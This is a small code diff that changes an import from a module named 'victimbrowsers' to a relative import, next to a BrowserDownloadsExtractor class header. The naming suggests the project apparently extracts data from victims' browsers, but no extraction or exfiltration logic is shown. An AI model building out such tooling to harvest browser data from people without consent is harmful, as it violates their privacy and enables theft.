@@ -3,7 +3,7 @@ import shutil
 import sqlite3
 import base64
 from datetime import datetime, timedelta
-from victimbrowsers import navegadores_instalados  
+from .victimbrowsers import navegadores_instalados  
 
 class BrowserDownloadsExtractor:
     def __init__(self, browser_name: str):
